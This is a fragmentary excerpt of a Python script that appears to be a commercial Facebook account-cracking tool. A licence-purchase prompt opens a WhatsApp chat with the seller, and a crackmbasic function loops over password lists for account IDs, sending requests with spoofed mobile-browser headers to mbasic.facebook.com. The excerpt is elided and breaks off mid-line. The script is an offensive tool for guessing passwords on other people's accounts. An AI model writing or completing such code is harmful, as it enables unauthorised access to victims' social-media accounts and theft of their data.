...
def login():
	...
	if kall in ['']:
	    ...
	    os.system("xdg-open https://wa.me/+2348167676589?text=Silenthacker+bang+gw+mau+beli+lisensi")
	    tlisensi()
	elif kall in ['trial','TRIAL']:
	     os.system("xdg-open https://wa.me/+2348167676589?text=Silenthacker+bang+gw+mau+trial+lisensi")
	     tlisensi()	 
...
def crackmbasic(idf,pwv):
	...
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q